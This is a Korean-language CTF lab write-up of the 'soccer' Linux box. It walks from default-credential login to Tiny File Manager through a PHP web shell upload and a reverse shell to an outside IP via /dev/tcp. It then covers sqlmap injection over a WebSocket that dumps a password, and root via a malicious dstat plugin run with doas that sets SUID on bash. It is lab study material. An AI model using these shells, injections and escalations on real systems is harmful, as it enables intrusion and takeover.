---
slug: "soccer"
title: "_soccer"
date: 2026-06-26
category: "미분류"
tags: []
excerpt: "-> blindsql 코드들 미리 짜봐 # Box: soccer | Linux | Easy"
readingTime: 8
---

-> blindsql 코드들 미리 짜봐
# Box: soccer | Linux | Easy

날짜: 2026.06.26
소요시간:

## Open Ports

- 22
- 80
- 9091

## Interesting Services

80 호스트 파일에 등록하고 접속

```shell
# common.txt 로는 별게 나오는게 없음
gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt

# 결과값
tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

## Initial Foothold

벡터: 명령어:

tiny에 들어왔더니 H3K Tiny File Manager 페이지가 나옴 구글 검색어에 default credential 연관 검색어에 뜨길래 해당 크레덴셜 입력하니까 로그인 됨

```
admin / admin@123
```

해당 `tinyfilemanager.php` 파일에 취약점이 있다고 함

**참고:** https://febinj.medium.com/tiny-file-manager-authenticated-rce-ad768d49fa0

**요약:** 이 웹앱이 파일을 업로드, 다운로드, 수정 등을 할 수 있는데 `../../../` 경로 탐색 공격(Path Traversal)을 실행할 수 있고 이걸로 php 웹쉘 실행이 가능함

```php
# 문제가 되는 코드 부분
if ( is_writable($targetPath) ) {
    $fullPath = $path . '/' . $_REQUEST['fullpath'];
```

일단 사용할 php 웹쉘 생성

```shell
echo '<?php echo system($_GET["cmd"]); ?>' >> shell.php
```

이후 파일이 업로드되는 경로를 찾음

```
/var/www/html/tiny/uploads
```

사실 path traversal 없이 그냥 uploads에 올리면 됨 (너무 돌아왔다 → 일 쉽게 할 생각해라 제발)

```shell
# 웹쉘 업로드 후 접근
http://soccer.htb/tiny/uploads/shell.php?cmd=ls
```

리버스 쉘 실행

```
http://soccer.htb/tiny/uploads/exploit.php?cmd=/bin/bash+-c+%27/bin/bash+-i+%3E%26+/dev/tcp/10.10.15.242/4444+0%3E%261%27
```

## Privilege Escalation: www-data → player

벡터: 명령어:

```shell
cat /etc/passwd | grep -E "bash|sh$"
# player, root 나옴 → 여기로 권한 상승 해야함
```

현재 사용되고 있는 네트워크 정보 보기

```shell
netstat -tnlp
# 3306, 33060 두개 나옴 → mysql 포트임 (인증 안돼서 못씀)

ps auxww
# nginx 작동중

cd /etc/nginx/sites-available
# soc-player.soccer.htb 파일 발견
```

hosts 파일에 추가 후 접속

```shell
echo "10.129.19.98 soc-player.soccer.htb" | sudo tee -a /etc/hosts
```

접속해서 회원가입 후 로그인하면 check 페이지로 리다이렉션됨 티켓 번호 넣으면 `Ticket Exists`, 이상한 값 넣으면 `Ticket Doesn't Exist`

Burp Suite에서 WebSocket 방식은 `Proxy → WebSockets` 창으로 가야함

```
# 이게 안 먹힘 (문자열이 아니라 숫자를 받고 있어서)
' or 1=1 --

# 따옴표 빼고 숫자로
1 or 1=1 --
# → Ticket Exists 뜸

# 컬럼 3개 확인
1 Union select 1,2,3 --
```

페이지 소스에서 WebSocket 엔드포인트 확인

```javascript
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
```

### SQLMap

SQL 분석 자동화 도구. 사용법은 `sqlmap -h` 참고

```shell
sqlmap -u "ws://soc-player.soccer.htb:9091/check" \
  --cookie "connect.sid=s%3AWb-RSv0W2JqB-nDLlx4icPyoGvrIxsDl.N0lWPd8%2FtwItstErH8YJX83j22T8pBge9v1QObj7%2FQQ" \
  --dbms=mysql --level=4 --risk=4 --batch \
  --data '{"id":"*"}' --dbs
# DB 나오면 -D <dbname> --tables
# 테이블 나오면 -D <dbname> -T <table> --dump
```

`--data`는 Burp에서 미리 확인한 형식, `*`는 페이로드 삽입 위치

**최종 결과**

DB: `soccer_db` / Table: `accounts`

|id|email|password|username|
|---|---|---|---|
|1324|player@player.htb|PlayerOftheMatch2022|player|

```shell
ssh player@10.129.19.98
cat ~/user.txt
# 750ea48b39bc0576efdf3c133e87465a
```

## Privilege Escalation: player → root

벡터: 명령어:

```shell
find / -user root -perm -4000 -ls 2>/dev/null
# doas 실행 가능 → doas.conf 읽기

cat /usr/local/etc/doas.conf
# permit nopass player as root cmd /usr/bin/dstat
```

doas는 sudo랑 비슷한데 좀 더 간단한 버전

**참고:** https://morgan-bin-bash.gitbook.io/linux-privilege-escalation

dstat은 python 플러그인을 로드할 수 있음 → root 권한으로 실행되는 doas + dstat으로 bash에 SUID 설정 가능

```shell
# dstat 플러그인 로드 경로 확인
find / -type d -name dstat 2>/dev/null
# /usr/local/share/dstat (여기가 player 쓰기 권한 있음)

# 악성 플러그인 작성
echo "import os;os.system('chmod +s /usr/bin/bash')" > /usr/local/share/dstat/dstat_exploit.py

# 플러그인 인식 확인
dstat --list | grep exploit

# doas로 root 권한으로 실행
doas /usr/bin/dstat --exploit
# (에러 떠도 코드는 실행된 상태)

# SUID 타고 root 쉘
bash -p

cat /root/root.txt
# 6a370ff84968fbc0605b4404400a6457
```

## Rabbit Hole (막혔던 것)
대체적으로 다
## 다음 박스에서 써먹을 것
- WebSocket SQLi → sqlmap `ws://` 프로토콜 지원
- doas/sudo 허용 명령어 플러그인 로드 경로 확인
- SUID bash → `bash -p`
- default credential 검색 습관화